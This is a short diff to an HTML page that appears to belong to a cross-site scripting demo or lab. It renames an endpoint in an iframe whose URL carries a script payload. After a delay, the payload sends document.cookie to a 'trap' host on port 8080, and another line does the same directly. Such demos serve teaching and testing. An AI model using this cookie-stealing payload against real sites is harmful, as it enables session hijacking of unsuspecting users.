@@ -13,7 +13,7 @@
         window.location='http://trap:8080/trap/getCookie?sid='+document.cookie;
     </div>
     <iframe width="512" height="256"
-            src="http://localhost:8080/xss1?keyword=<script>window.setTimeout(function(){window.location='http://trap:8080/trap/xss1GetCookie?sid='%2Bdocument.cookie},3000);</script>">
+            src="http://localhost:8080/keyword?keyword=<script>window.setTimeout(function(){window.location='http://trap:8080/trap/keywordGetCookie?sid='%2Bdocument.cookie},3000);</script>">
     </iframe>
 </body>
 </html>
